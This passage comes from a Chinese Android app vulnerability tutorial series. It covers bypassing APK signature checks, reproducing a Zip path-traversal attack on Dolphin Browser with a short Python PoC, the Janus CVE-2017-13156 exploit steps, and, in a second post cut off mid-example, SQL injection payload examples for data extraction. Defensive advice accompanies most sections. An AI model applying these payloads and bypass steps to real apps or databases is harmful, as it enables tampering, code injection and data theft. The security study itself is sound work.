title=\"（1）原理分析\"></a>（1）原理分析</h4><p>我们知道一般对APK的验证，主要使用的是签名校验或者MD5校验，使用校验的方式较多。而签名校验一般是处理APK中动态加载或防止二次重打包的问题。</p>\n<p>我们可以将APK中的签名检验机制进一步进行分类：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java层的签名校验：</span><br><span class=\"line\">原理：这种是开发者在APK java层中加入了签名校验代码，然后通过校验加入文件的MD5值或者SHA1值来对文件进行校验</span><br><span class=\"line\">解决方案：一般这种情况，我们通过定位到APK中的签名代码段，然后进行hook 篡改或者进行修改后重打包就可以进行绕过</span><br><span class=\"line\">so层的签名校验：</span><br><span class=\"line\">原理：由于java可解释语言的原因，所以后来开发者又将签名代码放入so层，从而增加逆向工作的难度</span><br><span class=\"line\">解决方案：这种情况，同样可以使用IDA或GDB进行动态调试确定到签名代码段，然后使用hook 注入技术或静态修改来进行绕过</span><br><span class=\"line\">在线签名校验：</span><br><span class=\"line\">原理：由于前两种方式都是静态校验的方式，这样的安全性仍然较低，后来更多厂商通过服务器在线进行验证，将签名密钥发送然后在so层或java层中进行校验</span><br><span class=\"line\">解决方案：这种情况，我们要使用抓包软件对服务器发送的数据包进行抓取，在成功获取正确密钥后，再去hook对应的签名代码段，从而就可以实现绕过</span><br></pre></td></tr></table></figure>\n\n<p>这一部分完整性保护大家可以详细的参考看雪陌殇大佬的帖子<a href=\"https://bbs.pediy.com/thread-250990.htm\">Android应用完整性保护总结</a></p>\n<h4 id=\"（2）案例2——java层签名绕过\"><a href=\"#（2）案例2——java层签名绕过\" class=\"headerlink\" title=\"（2）案例2——java层签名绕过\"></a>（2）案例2——java层签名绕过</h4><p>案例：书旗小说.apk</p>\n<p>我们发现书旗小说在进行重新签名后，再次安装会报错，首先我们AndroidKiller解析APP：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/33.png\" alt=\"image-20211010150449575\"></p>\n<p>然后我们开始进行定位，这里我们使用常见的定位点：<strong>signature、killProcess、PageManager</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">signature、killProcess、PageManager 一般是签名代码的关键函数，所以当我们发现这三个函数同时出现，很大程度代表了签名点</span><br></pre></td></tr></table></figure>\n\n<p>我们这里搜索signature或killProcess，我们找到了签名三兄弟：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/34.png\" alt=\"image-20211010150449575\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/35.png\" alt=\"image-20211010150449575\"></p>\n<p>分析签名的逻辑，修改后回编译，再安装显示成功</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/37.png\" alt=\"image-20211010150449575\"></p>\n<h4 id=\"（3）案例3——so层签名绕过\"><a href=\"#（3）案例3——so层签名绕过\" class=\"headerlink\" title=\"（3）案例3——so层签名绕过\"></a>（3）案例3——so层签名绕过</h4><p>因为so层和java层签名绕过原理相近，只是so层是分析汇编代码，java层分析Smali源码，这里我们参考一个博主的案例，我列举一下</p>\n<p>首先我们根据NDK注册定位到so层的入口点，去查找JNI_Onload函数，然后开始去查找上面的三兄弟</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/38.png\" alt=\"image-20220307134654634\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/39.png\" alt=\"image-20220307134716046\"></p>\n<p>这里我们就很好的定位到了代码段，后续就是分析逻辑，修改对应的校验点即可</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/40.png\" alt=\"image-20220307134854959\"></p>\n<p>最后就会发现签名成功的绕过</p>\n<h4 id=\"（4）案例4——在线签名绕过\"><a href=\"#（4）案例4——在线签名绕过\" class=\"headerlink\" title=\"（4）案例4——在线签名绕过\"></a>（4）案例4——在线签名绕过</h4><p>在线签名校验主要是抓取校验部分的数据包，然后去查找cookie中的public_key，或者签名Signature值，通过分析数据包后再定位到相应的代码段将值回传到相应的代码段即可</p>\n<p>这里有一个案例大家可以参考<a href=\"https://bbs.pediy.com/thread-270634.htm#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\">Android APP漏洞之战（6）——HTTP&#x2F;HTTPs通信漏洞详解 </a>中酷狗直播的漏洞实现，这里就是通过在线修改了MD5值，然后使得程序在升级过程中绕过了升级校验，从而成功的注入了恶意病毒</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/41.png\" alt=\"image-20220307134854959\"></p>\n<h4 id=\"（5）安全防护\"><a href=\"#（5）安全防护\" class=\"headerlink\" title=\"（5）安全防护\"></a>（5）安全防护</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）java层和so层都可以进一步混淆，来防止字符定位的方法</span><br><span class=\"line\">（2）可以使用反调试技术，来防止动态调试进行定位的方法</span><br><span class=\"line\">（3）可以采用对frida和xposed的检测，来进行防止hook注入</span><br><span class=\"line\">（4）可以尽量采用在线签名，加密传输报文：</span><br><span class=\"line\">客户端将本地程序信息上传到服务端，服务端返回一段校验代码。客户端动态执行代码，返回校验结果</span><br><span class=\"line\">在登陆接口将登录信息在NDK层进行加密，用签名信息进行加密，在登陆接口实现中，进行解密，如果失败不允许登陆</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、Zip解压缩漏洞分析和复现\"><a href=\"#五、Zip解压缩漏洞分析和复现\" class=\"headerlink\" title=\"五、Zip解压缩漏洞分析和复现\"></a>五、Zip解压缩漏洞分析和复现</h2><h3 id=\"1-原理分析\"><a href=\"#1-原理分析\" class=\"headerlink\" title=\"1.原理分析\"></a>1.原理分析</h3><p>因为Linux系统中<code>../</code>代表向上级目录跳转，攻击者可以通过构造相应的Zip文件，利用多个’..&#x2F;‘从而改变zip包中某个文件的存放位置，费用该替换掉应用原有的文件，完成目录穿越。这样严重可能会导致任意代码执行漏洞，危害应用用户的设备安全和信息安全</p>\n<p><code>Java</code> 代码在解压 <code>zip</code> 文件时，会使用到 <code>ZipEntry</code> 类的 <code>getName()</code> 方法，如果 <code>zip</code> 文件中包含 <code>../</code> 的字符串，该方法返回值会原样返回。如果没有过滤掉 <code>getName()</code> 返回值中的 <code>../</code> 字符串，继续解压缩操作，就会在其他目录中创建解压的文件</p>\n<h3 id=\"2-漏洞复现\"><a href=\"#2-漏洞复现\" class=\"headerlink\" title=\"2.漏洞复现\"></a>2.漏洞复现</h3><p>样本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">海豚浏览器 V11.4.18</span><br><span class=\"line\">攻击的so文件：libdolphin.so</span><br><span class=\"line\">Poc攻击代码</span><br></pre></td></tr></table></figure>\n\n<p>我们打开海豚浏览器，并用Fiddler去监控海豚浏览器，Fiddler的配置大家可以参考我之前博客</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/47.png\" alt=\"image-20220307155050126\"></p>\n<p>这里我们可以通过抓包去发现主题下载的申请链接，然后我们将主题下载下来，然后解包查看结构，这里我们重命名为zip文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/54.png\" alt=\"image-20220307155156845\"></p>\n<p>我们可以发现下载下来的三个资源文件，这也说明海豚浏览器的主题本质是一个zip包</p>\n<p>那么我们如何实现zip目录穿越了，我们是不是可以尝试去构建一个这样的zip包，去替换浏览器的下载包，并重命令去文件名，使得替换浏览器中的关键文件，这里我们就尝试去替换浏览器中的<code>libdolphin.so</code>文件。我们先查看该文件的位置：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/48.png\" alt=\"image-20220307155820156\"></p>\n<p>此时我们知道了<code>libdolphin.so</code>文件的存放位置，目录为：<code>/data/data/com.dolphin.browser.express.web/files</code>，这样我们只需要将我们制作的<code>libdolphin.so</code>去替换原文件即可</p>\n<p>我们编写一个<code>libdolphin.so</code>文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/49.png\" alt=\"image-20220307163506122\"></p>\n<p>然后我们将生成的so文件重新命名<code>libdolphin.so</code>文件，接下来我们再使用我们的Poc代码更改名称：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    ZipPath = <span class=\"string\">&#x27;../../../../../data/data/com.dolphin.browser.express.web/files/libdolphin.so&#x27;</span></span><br><span class=\"line\">    zp = zipfile.ZipFile(<span class=\"string\">&#x27;/root/Desktop/zipAttack/attack.zip&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">    zp.write(<span class=\"string\">&#x27;/root/Desktop/zipAttack/libdolphin.so&#x27;</span>,ZipPath)</span><br></pre></td></tr></table></figure>\n\n<p>此时我们就成功的构造了我们的攻击文件<code>attack.zip</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/50.png\" alt=\"image-20220307165944152\"></p>\n<p>然后我们只需要对海豚浏览器下载主题的包进行劫持替换即可</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/51.png\" alt=\"image-20220307170221500\"></p>\n<p>然后我们再次点击手机下载相应主题，发现主题是成功的下载，但是并没有替换成功</p>\n<p>经过验证，我们发现首先正常命名的so文件是可以正常的和主题一起下载成功的</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/52.png\" alt=\"image-20220308102048695\"></p>\n<p>然后我们验证，Android中直接重命令文件<code>../../libdolphin.so</code>是可以直接回到上级目录的</p>\n<p>所以综上是因为我测试的Android6.0 已经打了补丁，在进行解压的时候对<code>../</code>这种情况进行了过滤，这样就导致不能进行成功的穿越</p>\n<p>当然这里我们主要是理解zip穿越的原理，这样就可以在很多地方利用这个原理存在的漏洞了</p>\n<h3 id=\"3-安全防护\"><a href=\"#3-安全防护\" class=\"headerlink\" title=\"3.安全防护\"></a>3.安全防护</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">对重要的 zip 压缩包文件进行数字签名校验，校验通过才进行解压</span><br><span class=\"line\">检查 zip 压缩包中使用 ZipEntry.getName() 获取的文件名中是否包含 ../ 或者 .. 字符</span><br><span class=\"line\">更换 zip 解压方式，不使用 ZipEntry.getName() 的方式，使用 ZipInputStream 替代</span><br></pre></td></tr></table></figure>\n\n<p>Google的修复意见：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">InputStream</span> <span class=\"variable\">is</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InputStream</span>(untrustedFileName);</span><br><span class=\"line\"><span class=\"type\">ZipInputStream</span> <span class=\"variable\">zis</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ZipInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">BufferedInputStream</span>(is));</span><br><span class=\"line\"><span class=\"keyword\">while</span>((<span class=\"type\">ZipEntry</span> <span class=\"variable\">ze</span> <span class=\"operator\">=</span> zis.getNextEntry()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">  <span class=\"type\">File</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(DIR, ze.getName());</span><br><span class=\"line\">  <span class=\"type\">String</span> <span class=\"variable\">canonicalPath</span> <span class=\"operator\">=</span> f.getCanonicalPath();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!canonicalPath.startsWith(DIR)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// SecurityException</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// Finish unzipping…</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"六、Janus漏洞分析和复现\"><a href=\"#六、Janus漏洞分析和复现\" class=\"headerlink\" title=\"六、Janus漏洞分析和复现\"></a>六、Janus漏洞分析和复现</h2><p>我们上面已经介绍了签名相关的漏洞、和Zip相关的漏洞，下面我们拿2017年的典型漏洞Janus漏洞进行说明，这个漏洞结合了签名和Zip、dex的原理</p>\n<h3 id=\"1-原理分析-1\"><a href=\"#1-原理分析-1\" class=\"headerlink\" title=\"1.原理分析\"></a>1.原理分析</h3><p>相信Janus漏洞原理大家已经十分熟悉了，作为2017年比较重大的Android漏洞，已经有不少的人对其进行了研究和复现，本节只是初步记录下Janus漏洞的学习过程和复现思路（Janus只针对v1签名，v2签名就无效了）</p>\n<p>Android  ART虚拟机在加载并执行一个文件时，会首先判断这个文件的类型。如果这个文件是一个Dex文件，则按Dex的格式加载执行，如果是一个APK文件，则先抽取APK中的dex文件，然后再执行。而判断的依据是通过文件的头部魔术字（Magic Code）来判断。如果文件的头部魔术字是“dex”则判定该文件为Dex文件，如果文件头部的魔术字是“PK”则判定该文件为Apk文件</p>\n<p>然而Android在安装一个APK时会对APK进行签名校验，但却直接默认该APK就是一个Zip文件（并不检查文件头的魔术字），而ZIP格式的文件一般都是从尾部先读取，因此只要ZIP文件尾部的数据结构没有被破坏，并且在读取过程中只要没有碰到非正常的数据，那么整个读取就不会有任何问题</p>\n<p>因此，Android在加载执行代码时，<strong>只认文件头，而安装签名时只认文件尾</strong></p>\n<p>这样我们构造一个APK<strong>，从其头部看是一个Dex文件，从其尾部看，是一个APK文件</strong>，就可以实施攻击。因此Janus漏洞便是将原APK中的classes.dex抽取出来，改造或替换成攻击者想要执行的dex，并将这个dex和原APK文件拼起来，合成一个文件</p>\n<p>当然我们在构造apk时，还需要修改dex文件的字段和zip文件的字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dex文件修改DexHeader中的file_size，将其调整为合并后文件的大小</span><br><span class=\"line\">zip文件修改尾部Zip,修正[end of central directory record]中[central directory]的偏移和[central directory]中各[local file header]的偏移</span><br></pre></td></tr></table></figure>\n\n<p>漏洞攻击步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 从设备上取出目标应用的APK文件，并构造用于攻击的DEX文件；</span><br><span class=\"line\">2. 将攻击DEX文件与原APK文件简单拼接为一个新的文件；</span><br><span class=\"line\">3. 修复这个合并后的新文件的ZIP格式部分和DEX格式部分，修复原理如图1所示，需要修复文件格式中的关键偏移值和数据长度值；</span><br><span class=\"line\">最后，将修复后的文件，重命名为APK文件，覆盖安装设备上的原应用即可</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-漏洞复现-1\"><a href=\"#2-漏洞复现-1\" class=\"headerlink\" title=\"2.漏洞复现\"></a>2.漏洞复现</h3><p>实验样本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">app-release.apk v1签名的初始样本</span><br><span class=\"line\">classes.dex 修改后的dex文件</span><br><span class=\"line\">out.apk 拼接后的apk文件</span><br><span class=\"line\">janus.py 漏洞拼接代码</span><br></pre></td></tr></table></figure>\n\n<p>首先，我们通过Android Studio编写apk文件，并通过v1签名生成</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/42.png\" alt=\"image-20220221160839695\"></p>\n<p>我们在Bulid—&gt;Generate Signed APK中选择通过v1签名来生成apk文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/46.png\" alt=\"image-20220221160944398\"></p>\n<p>我们便得到了app-release.apk文件，我们再通过AndroidKiller去修改源文件的代码，然后重新打包</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/44.png\" alt=\"image-20220221161347673\"></p>\n<p>然后我们提取出生成的apk文件中的classes.dex文件</p>\n<p>我们是使用<a href=\"https://github.com/V-E-O/PoC/blob/master/CVE-2017-13156/janus.py\">Janus.py python2版本</a> 和<a href=\"https://github.com/xyzAsian/Janus-CVE-2017-13156\">java版本</a>，这里我们使用Python版本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/45.png\" alt=\"image-20220221161702364\"></p>\n<p>我们就得到拼接的out.apk，我们只需要将这个apk去覆盖原始的apk即可</p>\n<p>问题：</p>\n<p>在尝试了几台Android 6.0的机子后，并未成功复现漏洞，最后推断很大程度是Android 系统打了补丁，所以要复现成功可能只能在未打补丁的系统上才行，不过整体来说是一次很好的学习经历</p>\n<h3 id=\"3-安全防护-1\"><a href=\"#3-安全防护-1\" class=\"headerlink\" title=\"3.安全防护\"></a>3.安全防护</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android7.0后采用了v2签名机制可以有效的抵制Janus漏洞</span><br><span class=\"line\">现在大部分的手机系统已经打上了Janus漏洞的补丁</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"七、实验总结\"><a href=\"#七、实验总结\" class=\"headerlink\" title=\"七、实验总结\"></a>七、实验总结</h2><p>本文对插件化和解压缩漏洞进行了详细的讲解和漏洞复现，在漏洞复现的过程中，我们发现一个漏洞复现的环境十分重要，因为很多时候曾经的一些典型漏洞都被打了补丁，很难在当下情况复现，当然我们应该更加注重漏洞的原理，从而进行学习，本文可能还存在一些不足之处就请各位大佬指教了。</p>\n<p>本文的相关实验文件存放在知识星球中，本系列的实验文件后面也会逐一上传到知识星球。</p>\n<h2 id=\"八、参考文献\"><a href=\"#八、参考文献\" class=\"headerlink\" title=\"八、参考文献\"></a>八、参考文献</h2><p>dex文件结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://juejin.cn/post/6844903847647772686</span><br><span class=\"line\">https://www.jianshu.com/p/b79c729f326b</span><br><span class=\"line\">https://www.jianshu.com/p/f7f0a712ddfe</span><br></pre></td></tr></table></figure>\n\n<p>zip文件结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://blog.sina.com.cn/s/blog_4c3591bd0100zzm6.html</span><br><span class=\"line\">https://thismj.cn/2019/02/14/qian-xi-zip-ge-shi/</span><br></pre></td></tr></table></figure>\n\n<p>Android APK签名机制：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://jishuin.proginn.com/p/763bfbd56b8b</span><br><span class=\"line\">https://www.jianshu.com/p/286d2b372334</span><br><span class=\"line\">https://xuanxuanblingbling.github.io/ctf/android/2018/12/30/signature/</span><br></pre></td></tr></table></figure>\n\n<p>插件化漏洞原理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.cnblogs.com/goodhacker/p/5152952.html</span><br><span class=\"line\">https://wooyun.js.org/drops/APK%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87.html</span><br><span class=\"line\">https://www.freebuf.com/articles/network/273466.html</span><br><span class=\"line\">https://www.jianshu.com/p/14719d3a508f</span><br><span class=\"line\">https://fiissh.tech/2021/android-fix-zip-path-traversal-vulnerability.html</span><br></pre></td></tr></table></figure>\n\n<p>Janus漏洞原理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bbs.pediy.com/thread-223539.htm</span><br><span class=\"line\">https://github.com/tea9/CVE-2017-13156-Janus</span><br><span class=\"line\">https://cert.360.cn/warning/detail?id=d5a609929388cfd84c7e9aa8fb943265</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（18）——Sql漏洞初探","url":"/2023/02/14/bug0018/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近一直很忙碌，即将进入本系列文章基础篇的最后几个篇章，本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。</p>\n<span id=\"more\"></span>\n<p>本文结构如下：</p>\n<p>第二节讲述SQL注入的基本原理</p>\n<p>第三节讲述常见的SQL注入漏洞并复现</p>\n<p>第四节讲述Content Provider上的sql注入漏洞</p>\n<p>第五节讲述DownProvider 上的sql注入漏洞</p>\n<h2 id=\"二、SQL漏洞原理介绍\"><a href=\"#二、SQL漏洞原理介绍\" class=\"headerlink\" title=\"二、SQL漏洞原理介绍\"></a>二、SQL漏洞原理介绍</h2><h3 id=\"1-SQL注入原理\"><a href=\"#1-SQL注入原理\" class=\"headerlink\" title=\"1.SQL注入原理\"></a>1.SQL注入原理</h3><p>通过实施 SQL 注入，攻击者可以获得对应用程序或数据库的完全访问权限，从而可以不负责任地删除或更改重要数据。未正确验证用户输入的应用程序使它们容易受到 SQL 注入的攻击。 SQL 注入攻击 (SQLIA) 发生在攻击者能够通过操纵用户输入数据将一系列恶意 SQL 语句插入“查询”以供后端数据库执行时。使用这种类型的威胁，应用程序可以很容易地被黑客入侵并被攻击者窃取机密数据。</p>\n<p>SQL攻击的原理图如下所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/0.png\" alt=\"image-20220707092239296\"></p>\n<p>上图中攻击者将 SQL 语句添加到应用程序表单输入框中，以访问资源或更改存储在数据库中的数据。应用程序中缺少输入验证会导致攻击者成功。在 SQL 注入攻击中，攻击者通过应用程序注入字符串输入，从而改变或操纵 SQL 语句以使攻击者受益。</p>\n<h3 id=\"2-SQL注入分类\"><a href=\"#2-SQL注入分类\" class=\"headerlink\" title=\"2.SQL注入分类\"></a>2.SQL注入分类</h3><p>要学习SQL注入在Android上的使用，首先需要了解SQL注入的种类，SQL注入一般分为两种情况：<code>有回显和无回显</code>，有回显是指SQL语句返回的内容有显示在页面中；无回显是页面输出的内容并不是SQL语句返回的内容，而是“真”和“假”。</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/1.png\" alt=\"image-20220707093229055\"></p>\n<h4 id=\"（1）联合查询注入\"><a href=\"#（1）联合查询注入\" class=\"headerlink\" title=\"（1）联合查询注入\"></a>（1）联合查询注入</h4><p>联合查询注入是在原有的查询条件下，通过union拼接上select语句，union可以用于合并两个和多个select语句的结果集</p>\n<p>当union之前的select语句结果集为空时，查询结果将由union后的select语句控制。</p>\n<p>联合查询语句构造步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.order by判断原有查询语句的列数</span><br><span class=\"line\">2.使原有查询语句的结果为空</span><br><span class=\"line\">3.判断数据输出位置</span><br><span class=\"line\">4.使用union语句拼接目标数据的查询语句</span><br></pre></td></tr></table></figure>\n\n<p>对于页面有回显，通常使用联合查询注入，可以快速爆出数据</p>\n<p>示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by <span class=\"comment\">//确定列数</span></span><br><span class=\"line\"></span><br><span class=\"line\">union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span> <span class=\"comment\">//显示回显位</span></span><br><span class=\"line\"></span><br><span class=\"line\">union select <span class=\"number\">1</span>,database(),user() <span class=\"comment\">//通过回显位爆出内容</span></span><br><span class=\"line\"></span><br><span class=\"line\">union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,group_concat(schema_name) from information_schema.schemata <span class=\"comment\">//爆库</span></span><br><span class=\"line\"></span><br><span class=\"line\">union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() <span class=\"comment\">//爆表</span></span><br><span class=\"line\"></span><br><span class=\"line\">union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class=\"string\">&#x27;表名&#x27;</span> and table_schema=database() <span class=\"comment\">//爆列</span></span><br><span class=\"line\"></span><br><span class=\"line\">union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,group_concat(列名) from 表名 <span class=\"comment\">//爆值</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）报错注入\"><a href=\"#（2）报错注入\" class=\"headerlink\" title=\"（2）报错注入\"></a>（2）报错注入</h4><p>报错注入经过构造的函数，让函数处理<code>user()</code>等不合规定的数据，引发mysql报错；几乎任何与数据库有关的操作经过sql拼接都可以产生报错注入；当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容</p>\n<p>构造报错注入的语句：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>构造目标数据查询语句</span><br><span class=\"line\"><span class=\"number\">2.</span>选择报错注入函数</span><br><span class=\"line\"><span class=\"number\">3.</span>构造报错注入语句</span><br><span class=\"line\"><span class=\"number\">4.</span>拼接报错注入语句</span><br><span class=\"line\">常见的报错注入函数：floor()、extractvalue()、updatexml()等</span><br></pre></td></tr></table></figure>\n\n<p>报错注入一般使用在查询不回显数据，但会打印错误信息的页面中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(select <span class=\"title function_\">user</span><span class=\"params\">()</span>),<span class=\"number\">0x7e</span>)) <span class=\"comment\">//extractvalue报错将输出的字符长度限制为32位</span></span><br><span class=\"line\"></span><br><span class=\"line\">updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(select <span class=\"title function_\">database</span><span class=\"params\">()</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>) <span class=\"comment\">//updatexml报错将输出的字符长度限制为32位</span></span><br><span class=\"line\"></span><br><span class=\"line\">select <span class=\"title function_\">count</span><span class=\"params\">(\\*)</span> from information_schema.tables GROUP BY <span class=\"title function_\">concat</span><span class=\"params\">((select database()</span>),floor(rand(<span class=\"number\">0</span>)\\*<span class=\"number\">2</span>)) <span class=\"comment\">//floor报错将输出字符长度限制为64个字符</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）布尔盲注\"><a href=\"#（3）布尔盲注\" class=\"headerlink\" title=\"（3）布尔盲注\"></a>（3）布尔盲注</h4><p>布尔盲注以页面回显内容的不同作为判定依据，通过构造语句返回页面的“真”和“假”来判断数据库信息的正确性</p>\n<p>布尔盲注提取数据的基本步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>构造目标数据查询语句</span><br><span class=\"line\"><span class=\"number\">2.</span>选择拼接方式</span><br><span class=\"line\"><span class=\"number\">3.</span>构造判断表达式</span><br><span class=\"line\"><span class=\"number\">4.</span>提取数据长度</span><br><span class=\"line\"><span class=\"number\">5.</span>提取数据内容</span><br><span class=\"line\">常见的拼接方式：原始条件真 and 判断条件真，原始条件假 or 判断条件真等</span><br></pre></td></tr></table></figure>\n\n<p>若网页设置了无报错信息返回，在不回显数据+不返回报错信息的情况下，只剩下盲注方法可用，而布尔盲注使用在对真&#x2F;假条件的返回内容很容易区分的页面中。</p>\n<p>示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">length(database()) <span class=\"comment\">//判断数据库名长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">ascii(substr((database()),s,<span class=\"number\">1</span>))=可用ASCII码值 <span class=\"comment\">//从数据库库名第s位开始，截取一位，进行逐一猜解；数据库库、表、字段所有名称的可用字符范围为A-Z、a-z、0-9和下划线，也就是ASCII码值从48到122</span></span><br><span class=\"line\"></span><br><span class=\"line\">length((select table_name from information_schema.tables where table_schema=database() limit <span class=\"number\">3</span>,<span class=\"number\">1</span>)) <span class=\"comment\">//判断数据库中的第4个表表名长度，第1个表从0开始</span></span><br><span class=\"line\"></span><br><span class=\"line\">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class=\"number\">3</span>,<span class=\"number\">1</span>),s,<span class=\"number\">1</span>))=可用ASCII码值 <span class=\"comment\">//逐一猜解第4个表的表名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//之后逐一猜解列名与数据</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）时间盲注\"><a href=\"#（4）时间盲注\" class=\"headerlink\" title=\"（4）时间盲注\"></a>（4）时间盲注</h4><p>时间盲注通过构造语句，通过页面响应的时长来判断信息；时间盲注的关键点在于if()函数，通过条件语句进行判断，为真则立即执行，否则延时执行，通常使用sleep()等专用的延时函数来进行延时操作</p>\n<p>时间盲注与布尔盲注的语句构造过程相似，通常在布尔盲注表达式的基础上使用if函数加入延时语句来构造。通常情况下，盲注需要逐个字符进行判断，极大增加了时间成本，而对于时间盲注来说，还需要额外的延迟时间来作为判断的标准</p>\n<p>在布尔盲注永假条件所返回的内容与正常语句返回的内容很接近或相同，无法判断的情况下，可使用时间盲注</p>\n<p>示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sleep() <span class=\"comment\">//使用延时函数进行判断</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(length(database())=数字,sleep(<span class=\"number\">2</span>),<span class=\"number\">0</span>) <span class=\"comment\">//if()函数判断数据库长度，if(Condition,A,B)，当Condition为true时返回A，当Condition为false时返回B</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(ascii(substr(database(),s,<span 